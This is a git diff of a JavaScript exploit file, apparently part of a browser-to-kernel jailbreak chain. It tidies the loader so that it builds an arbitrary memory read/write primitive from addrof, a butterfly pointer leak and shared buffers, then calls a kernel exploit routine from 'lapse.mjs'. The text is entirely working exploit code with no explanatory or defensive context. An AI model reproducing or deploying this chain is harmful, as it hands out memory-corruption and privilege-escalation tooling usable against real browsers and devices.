@@ -427,34 +427,22 @@ var expl_slave = new DataView(shared_buf);
     m[7] = 1;
 
 
+import { Memory } from './module/mem.mjs';
+import { Int as Int64 } from './module/int64.mjs';
+import * as lapse from './lapse.mjs';
 
 async function load_lapse() {
-//  const { Memory } = await import('./module/mem.mjs');
-//  const { Int: Int64 } = await import('./module/int64.mjs');
+ 
+ const obj = { addr: null, 0: 0 };
 
-
-let mod = await import('./module/mem.mjs');
-  let imod = await import('./module/int64.mjs');
-
-  const Memory = mod.Memory;
-  const Int64 = imod.Int;
-	
-  const obj = { addr: null, 0: 0 };
-
-  
   const rawPtr = window.addrof(obj);
-//  alert("rawPtr = 0x" + rawPtr.toString(16));
-
   const btRaw = window.read_ptr_at(rawPtr + 8);
- // alert("butterfly raw = 0x" + btRaw.toString(16));
-
 
   const obj_p = new Int64(rawPtr >>> 0, (rawPtr / 0x100000000) >>> 0);
-  const obj_bt = new Int64(btRaw  >>> 0, (btRaw  / 0x100000000) >>> 0);
+  const obj_bt = new Int64(btRaw >>> 0, (btRaw / 0x100000000) >>> 0);
 
   const off0x10 = new Int64(0x10, 0);
-// const master_b = new Uint32Array(new ArrayBuffer(1));  
- // const slave_b  = new DataView   (new ArrayBuffer(1)); 
+
   new Memory(
     expl_master,
     expl_slave,
@@ -463,57 +451,9 @@ let mod = await import('./module/mem.mjs');
     obj_bt
   );
 
- /*const s = document.createElement('script');
-  s.type = 'module';
-  s.src  = './lapse.mjs';  /
-  s.onerror = e => alert('Errore nel caricamento di lapse.mjs', e);
-  document.head.appendChild(s);
-	 */
-   //import('./lapse.mjs');
-/* import('./lapse.mjs')
-  .then(() => alert('lapse.mjs importato con successo'))
-  .catch(e => alert('errore import lapse.mjs: ' + e.message));*/
  
-//import('./lapse.mjs');
-/*  import('./lapse.mjs').then(moda => {
-   moda.kexploit();
-});*/
-	
-  // window.loadLapseModule();
-
-// const lapseModule = 
-//lapseModule.kexploit();
- import('./lapse.mjs');
-  /*const lapseUrl = new URL('lapse.mjs', document.baseURI).href;
-
- 
-  const moduleSrc = `
-    import('${lapseUrl}')
-      .then(mods => {
- 
-      })
-      .catch(e => {
- 
-        alert('Errore import lapse.mjs: ' + e);
-      });
-  `;
-
- 
-  const blob = new Blob([moduleSrc], { type: 'application/javascript' });
-  const url  = URL.createObjectURL(blob);
-
-  const script = document.createElement('script');
-  script.type = 'module';
-  script.src  = url;
-  document.head.appendChild(script);
-
-   
- // setTimeout(() => URL.revokeObjectURL(url), 60000);
-
-*/
- 
+  lapse.kexploit();
 }
- 
 
  
 
